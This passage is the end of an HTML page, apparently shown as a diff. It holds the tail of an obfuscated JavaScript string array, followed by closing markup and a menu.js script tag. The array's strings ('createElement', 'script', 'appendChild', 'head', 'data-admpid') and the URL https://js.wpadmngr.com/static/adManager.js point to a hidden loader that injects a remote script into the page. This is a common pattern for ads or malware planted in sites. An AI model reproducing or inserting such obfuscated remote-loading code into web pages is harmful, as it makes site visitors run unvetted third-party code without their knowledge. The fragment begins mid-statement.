Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
